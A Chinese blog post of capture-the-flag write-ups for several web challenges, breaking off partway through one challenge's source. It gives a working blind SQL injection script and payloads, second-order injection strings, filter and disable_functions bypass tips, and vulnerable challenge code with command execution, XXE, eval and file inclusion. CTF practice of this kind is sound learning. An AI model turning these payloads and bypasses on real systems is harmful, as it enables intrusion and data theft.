<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>4月做题 | oxcccccc</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="4月做题happyctfd刚开始看这个非常怕…后来谷歌了一下ctfd的cve直接打穿,这题就是弟弟  https:&#x2F;&#x2F;copyfuture.com&#x2F;blogs-details&#x2F;20200305225221297r8myv7xpvv0lqr0  登陆后台后把数据导出就拿到flag了 flag{1b236e8e-8f64-461d-a973-7059e706aeec} finalsql有两处注入点 第">
<meta property="og:type" content="article">
<meta property="og:title" content="4月做题">
<meta property="og:url" content="http:&#x2F;&#x2F;blog.ccreater.top&#x2F;2020&#x2F;05&#x2F;05&#x2F;4%E6%9C%88%E5%81%9A%E9%A2%98&#x2F;index.html">
<meta property="og:site_name" content="oxcccccc">
<meta property="og:description" content="4月做题happyctfd刚开始看这个非常怕…后来谷歌了一下ctfd的cve直接打穿,这题就是弟弟  https:&#x2F;&#x2F;copyfuture.com&#x2F;blogs-details&#x2F;20200305225221297r8myv7xpvv0lqr0  登陆后台后把数据导出就拿到flag了 flag{1b236e8e-8f64-461d-a973-7059e706aeec} finalsql有两处注入点 第">
<meta property="og:locale" content="zh">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;16&#x2F;OFIVpwyUmARvcdE.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;16&#x2F;qu6dkEK9UMVw2IQ.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;16&#x2F;of6Vy52wIlsvBgQ.png">
<meta property="article:published_time" content="2020-05-05T02:01:58.175Z">
<meta property="article:modified_time" content="2020-05-05T02:01:58.176Z">
<meta property="article:author" content="ccreater">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;16&#x2F;OFIVpwyUmARvcdE.png">
  
    <link rel="alternate" href="/atom.xml" title="oxcccccc" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 4.1.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">oxcccccc</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.ccreater.top"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-4月做题" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/05/05/4%E6%9C%88%E5%81%9A%E9%A2%98/" class="article-date">
  <time class="dt-published" datetime="2020-05-05T02:01:58.175Z" itemprop="datePublished">2020-05-05</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      4月做题
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="4月做题"><a href="#4月做题" class="headerlink" title="4月做题"></a>4月做题</h1><h2 id="happyctfd"><a href="#happyctfd" class="headerlink" title="happyctfd"></a>happyctfd</h2><p>刚开始看这个非常怕…后来谷歌了一下ctfd的cve直接打穿,这题就是弟弟</p>
<p> <a href="https://copyfuture.com/blogs-details/20200305225221297r8myv7xpvv0lqr0" target="_blank" rel="noopener">https://copyfuture.com/blogs-details/20200305225221297r8myv7xpvv0lqr0</a> </p>
<p>登陆后台后把数据导出就拿到flag了</p>
<p><code>flag{1b236e8e-8f64-461d-a973-7059e706aeec}</code></p>
<h2 id="finalsql"><a href="#finalsql" class="headerlink" title="finalsql"></a>finalsql</h2><p>有两处注入点</p>
<p>第一处:</p>
<p><code>/search.php?id=1</code></p>
<p>黑名单:<code>hex,if, ,and</code></p>
<p>payload:<code>/search.php?id=1/(((select(ord(substr(group_concat(table_name),20,1)))from(information_schema.tables)where(table_schema=database()))-31)&gt;0)</code></p>
<p>盲注脚本:</p>
<pre><code class="python">import requests
import time
#修改bigger和sqlinj就好


#实现bigger才能使用
def findByDichotomy(begin,end):
    max_num=end
    while True:
        mid=int((begin+end)/2)
        if begin==max_num:
            return False
        if begin==end:
            return begin
        if end-begin==1:
            if bigger(begin):
                return end
            else:
                return begin
        if bigger(mid):
            begin=mid+1
        else:
            end=mid

#待求数据大于num
def bigger(num):
    return sqlinj(num)
def less(num):
    pass
def equal(num):
    pass

def sqlinj(num):


    burp0_url = &quot;http://ff83c0e6-205f-4296-a512-fe2919cdeda4.node3.buuoj.cn:80/search.php?id=1/(((select(ord(substr(group_concat(username,&#39;,&#39;,password),POS,1)))from(F1naI1y))-GUESS)&gt;0)&quot;.replace(&quot;GUESS&quot;,str(num)).replace(&quot;POS&quot;,str(pos))
    burp0_headers = {&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://ff83c0e6-205f-4296-a512-fe2919cdeda4.node3.buuoj.cn/&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    res=requests.get(burp0_url, headers=burp0_headers)
    time.sleep(0.5)
    print(&quot;test &quot;,num)
    if &quot;NO! Not this! Click others~~~&quot; in res.text:
        return True
    else:
        return False


result=&quot;mygod,cl4y_is_really_amazing,welcome,welcome_to_my_blog,site,http://www.cl4y.top,site,http://www.cl4y.top,site&quot;
pos=len(result)+1
while True:
    num=findByDichotomy(32,128)
    if num is False:
        print(result)
        break
    result+=chr(num)
    print(result)
    pos+=1</code></pre>
<p>数据库:information_schema,test,performance_schema,mysql,geek</p>
<pre><code>F1naI1y,Flaaaaag

Flaaaaag:id,fl4gaws

F1naI1y:id,username,password

mygod,cl4y_is_really_amazing,welcome,welcome_to_my_blog,site,http://www.cl4y.top,site,http://www.cl4y.top,site,http://www.cl4y.top,site,http://www.cl4y.top,Syc,welcom_to_Syclover,finally,cl4y_really_need_a_grilfriend,flag,flag{2e7c980e-7fff-443b-8d1a-1371eaa326ba}</code></pre><p>测试后第二次发现不如第一处好用,就不写了</p>
<h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><pre><code class="python">
from flask import Flask, request
import os
app = Flask(__name__)

flag_file = open(&quot;flag.txt&quot;, &quot;r&quot;)
# flag = flag_file.read()
# flag_file.close()
#
# @app.route(&#39;/flag&#39;)
# def flag():
#     return flag
## want flag? naive!

# You will never find the thing you want:) I think
@app.route(&#39;/shell&#39;)
def shell():
    os.system(&quot;rm -f flag.txt&quot;)
    exec_cmd = request.args.get(&#39;c&#39;)
    os.system(exec_cmd)
    return &quot;1&quot;

@app.route(&#39;/&#39;)
def source():
    return open(&quot;app.py&quot;,&quot;r&quot;).read()

if __name__ == &quot;__main__&quot;:
    app.run(host=&#39;0.0.0.0&#39;)
</code></pre>
<p>去fd找flag</p>
<p><code>flag{7410ef7f-b10e-4da4-9beb-29f304fec028}</code></p>
<p>so easy</p>
<h2 id="blanklist"><a href="#blanklist" class="headerlink" title="blanklist"></a>blanklist</h2><p>堆叠注入,handle代替select</p>
<p><code>flag{dad3eb12-8877-4ea8-8bfe-98ac99a93715}</code></p>
<h2 id="枯燥的抽奖"><a href="#枯燥的抽奖" class="headerlink" title="枯燥的抽奖"></a>枯燥的抽奖</h2><pre><code class="php">&lt;?php
#这不是抽奖程序的源代码！不许看！
header(&quot;Content-Type: text/html;charset=utf-8&quot;);
session_start();
if(!isset($_SESSION[&#39;seed&#39;])){
$_SESSION[&#39;seed&#39;]=rand(0,999999999);
}

mt_srand($_SESSION[&#39;seed&#39;]);
$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
$str=&#39;&#39;;
$len1=20;
for ( $i = 0; $i &lt; $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
$str_show = substr($str, 0, 10);
echo &quot;&lt;p id=&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;


if(isset($_POST[&#39;num&#39;])){
    if($_POST[&#39;num&#39;]===$str){x
        echo &quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}&lt;/p&gt;&quot;;
    }
    else{
        echo &quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;;
    }
}
show_source(&quot;check.php&quot;);</code></pre>
<p>用php_mt_rand来爆破</p>
<p><code>flag{1c171630-aee4-400c-b629-a9e457cbe15e}</code></p>
<p>一定要去<code>https://www.openwall.com/php_mt_seed/</code>下载,不要去github的镜像下载,把我坑死了</p>
<h2 id="comment"><a href="#comment" class="headerlink" title="comment"></a>comment</h2><pre><code class="php">&lt;?php
include &quot;mysql.php&quot;;
session_start();
if($_SESSION[&#39;login&#39;] != &#39;yes&#39;){
    header(&quot;Location: ./login.php&quot;);
    die();
}
if(isset($_GET[&#39;do&#39;])){
switch ($_GET[&#39;do&#39;])
{
case &#39;write&#39;:
    $category = addslashes($_POST[&#39;category&#39;]);
    $title = addslashes($_POST[&#39;title&#39;]);
    $content = addslashes($_POST[&#39;content&#39;]);
    $sql = &quot;insert into board
            set category = &#39;$category&#39;,
                title = &#39;$title&#39;,
                content = &#39;$content&#39;&quot;;#category=result&#39; ,bo_id=&#39;1\
    $result = mysql_query($sql);
    header(&quot;Location: ./index.php&quot;);
    break;
case &#39;comment&#39;:
    $bo_id = addslashes($_POST[&#39;bo_id&#39;]);
    $sql = &quot;select category from board where id=&#39;$bo_id&#39;&quot;;
    $result = mysql_query($sql);
    $num = mysql_num_rows($result);
    if($num&gt;0){
    $category = mysql_fetch_array($result)[&#39;category&#39;];
    $content = addslashes($_POST[&#39;content&#39;]);
    $sql = &quot;insert into comment
            set category = &#39;$category&#39;,
                content = &#39;$content&#39;,
                bo_id = &#39;$bo_id&#39;&quot;;#insert into comment set category = &#39;result&#39; bo_id=&#39;1\&#39;,content=&#39;&#39;,bo_id=&#39;xxx&#39;;
    $result = mysql_query($sql);
    }
    header(&quot;Location: ./comment.php?id=$bo_id&quot;);
    break;
default:
    header(&quot;Location: ./index.php&quot;);
}
}
else{
    header(&quot;Location: ./index.php&quot;);
}
?&gt;
</code></pre>
<p>需要登陆才能留言</p>
<p>爆破可知: zhangwei / zhangwei666 (我吐了爆破半天没出来还是谷歌的,谁知道后面是全数字)</p>
<p>代码审计发现经典的二次注入啊</p>
<p>因为没有报错所以不知道自己的语句是否正确就调了很久</p>
<p>令<code>catagory=&#39;\\&#39;</code>,</p>
<pre><code>content=%2Ccontent%3D0x6464646464%2Cbo_id%3D1%2F*&amp;bo_id=1*/%23
content=%2Ccontent%3D(SELECT+group_concat(schema_name)+FROM+information_schema.schemata)%2Cbo_id%3D1%2F*&amp;bo_id=1*/%23
</code></pre><p>去把数据库dump下来后发现没啥东西</p>
<p>接着去试试读取文件</p>
<p>发现可以读取文件</p>
<p>读取/etc/passwd得到</p>
<pre><code>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
mysql:x:102:105:MySQL Server,,,:/var/lib/mysql:/bin/false
www:x:500:500:www:/home/www:/bin/bash</code></pre><p>发现只有一个可以登陆的用户:<code>www</code></p>
<p>查看他的<code>.bash_history</code></p>
<pre><code class="shell">cd /tmp/
unzip html.zip
rm -f html.zip
cp -r html /var/www/
cd /var/www/html/
rm -f .DS_Store
service apache2 start</code></pre>
<p>发现他要删除<code>.DS_Store</code>防止我们知道目录结构,但是<code>/tmp</code>目录是没有这个文件的,也就是所<code>/tmp/www</code>下有<code>.DS_Store</code>文件,拿到文件解析后得到flag文件名</p>
<pre><code>bootstrap
comment.php
css
flag_8946e1ff1ee3e40f.php
fonts
index.php
js
login.php
mysql.php
vendor
write_do.php</code></pre><h2 id="fakexml"><a href="#fakexml" class="headerlink" title="fakexml"></a>fakexml</h2><p>存在xxe</p>
<pre><code class="php">&lt;?php
/**
* autor: c0ny1
* date: 2018-2-7
*/

$USERNAME = &#39;admin&#39;; //
$PASSWORD = &#39;024b87931a03f738fff6693ce0a78c88&#39;; //
$result = null;

libxml_disable_entity_loader(false);
$xmlfile = file_get_contents(&#39;php://input&#39;);

try{
    $dom = new DOMDocument();
    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $creds = simplexml_import_dom($dom);

    $username = $creds-&gt;username;
    $password = $creds-&gt;password;

    if($username == $USERNAME &amp;&amp; $password == $PASSWORD){
        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username);
    }else{
        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username);
    }    
}catch(Exception $e){
    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());
}

header(&#39;Content-Type: text/html; charset=utf-8&#39;);
echo $result;
?&gt;</code></pre>
<p>直接读取/flag得到flag:<code>flag{663e8e72-be03-4533-a4cd-c44452942287}</code></p>
<h2 id="rce-me"><a href="#rce-me" class="headerlink" title="rce_me"></a>rce_me</h2><pre><code class="php">&lt;?php
error_reporting(0);
if(isset($_GET[&#39;code&#39;])){
            $code=$_GET[&#39;code&#39;];
                    if(strlen($code)&gt;40){
                                        die(&quot;This is too Long.&quot;);
                                                }
                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){
                                        die(&quot;NO.&quot;);
                                                }
                    @eval($code);
}
else{
            highlight_file(__FILE__);
}

// ?&gt;</code></pre>
<p>代码很简单,但是限制有点麻烦,我们利用<code>~</code>来绕过不允许字母和数字的限制</p>
<blockquote>
<p> 因为是一个语言构造器而不是一个函数，不能被 <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/functions.variable-functions.html">可变函数</a> 调用。 </p>
</blockquote>
<p>所以不能直接<code>(~&quot;eval的~&quot;)(&quot;xxxxx&quot;)</code>,都没总结这些命令,导致我过了很久才想起assert</p>
<p>disable_function:</p>
<pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl</code></pre><p>要读取flag必须命令执行,但是根据phpinfo,他禁用了system,exec等等用<code>https://github.com/mm0r1</code>这个大佬的脚本来绕过</p>
<p><code>flag{c7e5be35-729b-4bd0-aacd-c7a1eb98ddea}</code></p>
<h2 id="RCEService"><a href="#RCEService" class="headerlink" title="RCEService"></a>RCEService</h2><p>允许的字符:<code>,:,a-z,{,}</code></p>
<p>黑名单:<code>pwd,echo</code></p>
<p>刚开始以为是假的命令执行,看到报错后发现这是真的</p>
<pre><code class="php">Warning&lt;/b&gt;:  system() expects parameter 1 to be string, array given in &lt;b&gt;/var/www/html/index.php</code></pre>
<p>那先想办法读取index.php,测试后发现是用<code>$_REQUEST</code>来接受数据</p>
<p>后来实在没想法就去百度了,看到的wp都是清一色的直接给源码?????您们源码哪来的</p>
<pre><code class="php">&lt;?php

putenv(&#39;PATH=/home/rceservice/jail&#39;);

if (isset($_REQUEST[&#39;cmd&#39;])) {
  $json = $_REQUEST[&#39;cmd&#39;];

  if (!is_string($json)) {
    echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;;
  } elseif (preg_match(&#39;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#39;, $json)) {
    echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;;
  } else {
    echo &#39;Attempting to run command:&lt;br/&gt;&#39;;
    $cmd = json_decode($json, true)[&#39;cmd&#39;];
    if ($cmd !== NULL) {
      system($cmd);
    } else {
      echo &#39;Invalid input&#39;;
    }
    echo &#39;&lt;br/&gt;&lt;br/&gt;&#39;;
  }
}

?&gt;</code></pre>
<p>用换行来绕过preg_match或者输入足够长的字符来绕过preg的回溯次数</p>
<h2 id="CyberPunk"><a href="#CyberPunk" class="headerlink" title="CyberPunk"></a>CyberPunk</h2><pre><code class="php">&lt;?php

ini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;);

// $file = $_GET[&quot;file&quot;];
$file = (isset($_GET[&#39;file&#39;]) ? $_GET[&#39;file&#39;] : null);
if (isset($file)){
    if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) {
        echo(&#39;no way!&#39;);
        exit;
    }
    @include($file);
}
?&gt;

&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;index&lt;/title&gt;
&lt;base href=&quot;./&quot;&gt;
&lt;meta charset=&quot;utf-8&quot; /&gt;

&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;

&lt;/head&gt;
&lt;body&gt;
&lt;div id=&quot;h&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;h2&gt;2077发售了,不来份实体典藏版吗?&lt;/h2&gt;
        &lt;img class=&quot;logo&quot; src=&quot;./assets/img/logo-en.png&quot;&gt;&lt;!--LOGOLOGOLOGOLOGO--&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
                &lt;h3&gt;提交订单&lt;/h3&gt;
                &lt;form role=&quot;form&quot; action=&quot;./confirm.php&quot; method=&quot;post&quot; enctype=&quot;application/x-www-urlencoded&quot;&gt;
                    &lt;p&gt;
                    &lt;h3&gt;姓名:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;
                    &lt;h3&gt;电话:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;
                    &lt;h3&gt;地址:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;address&quot;&gt;
                    &lt;/p&gt;
                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;我正是送钱之人&lt;/button&gt;
                &lt;/form&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;f&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;
            &lt;a href=&quot;./search.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./change.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./delete.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;/button&gt;
            &lt;/a&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;!--?file=?--&gt;
</code></pre>
<p>search.php</p>
<pre><code class="php">&lt;?php

require_once &quot;config.php&quot;; 

if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
{
    $msg = &#39;&#39;;
    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
    $user_name = $_POST[&quot;user_name&quot;];
    $phone = $_POST[&quot;phone&quot;];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
        $msg = &#39;no sql inject!&#39;;
    }else{
        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
        $fetch = $db-&gt;query($sql);#日穿
    }

    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){
        $row = $fetch-&gt;fetch_assoc();
        if(!$row) {
            echo &#39;error&#39;;
            print_r($db-&gt;error);
            exit;
        }
        $msg = &quot;&lt;p&gt;姓名:&quot;.$row[&#39;user_name&#39;].&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;.$row[&#39;phone&#39;].&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;.$row[&#39;address&#39;].&quot;&lt;/p&gt;&quot;;
    } else {
        $msg = &quot;未找到订单!&quot;;
    }
}else {
    $msg = &quot;信息不全&quot;;
}
?&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;搜索&lt;/title&gt;
&lt;base href=&quot;./&quot;&gt;

&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;

&lt;/head&gt;
&lt;body&gt;
&lt;div id=&quot;h&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
                &lt;h1&gt;订单查询&lt;/h1&gt;
                &lt;form method=&quot;post&quot;&gt;
                    &lt;p&gt;
                    &lt;h3&gt;姓名:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;
                    &lt;h3&gt;电话:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;
                    &lt;/p&gt;
                    &lt;p&gt;
                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;查询订单&lt;/button&gt;
                    &lt;/p&gt;
                &lt;/form&gt;
                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;f&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;
            &lt;a href=&quot;./index.php&quot;&gt;
                &lt;button class=&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;返回&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./change.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;/button&gt;
            &lt;/a&gt; 
            &lt;a href=&quot;./delete.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;/button&gt;
            &lt;/a&gt;    
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>change.php</p>
<pre><code class="php">&lt;?php

require_once &quot;config.php&quot;;

if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
{
    $msg = &#39;&#39;;
    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
    $user_name = $_POST[&quot;user_name&quot;];
    $address = addslashes($_POST[&quot;address&quot;]);
    $phone = $_POST[&quot;phone&quot;];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = &#39;no sql inject!&#39;;
    }else{
        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
        $fetch = $db-&gt;query($sql);
    }

    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){
        $row = $fetch-&gt;fetch_assoc();
        $sql = &quot;update `user` set `address`=&#39;&quot;.$address.&quot;&#39;, `old_address`=&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where `user_id`=&quot;.$row[&#39;user_id&#39;];
        $result = $db-&gt;query($sql);
        if(!$result) {
            echo &#39;error&#39;;
            print_r($db-&gt;error);
            exit;
        }
        $msg = &quot;订单修改成功&quot;;
    } else {
        $msg = &quot;未找到订单!&quot;;
    }
}else {
    $msg = &quot;信息不全&quot;;
}
?&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;修改收货地址&lt;/title&gt;
&lt;base href=&quot;./&quot;&gt;

&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;

&lt;/head&gt;
&lt;body&gt;
&lt;div id=&quot;h&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
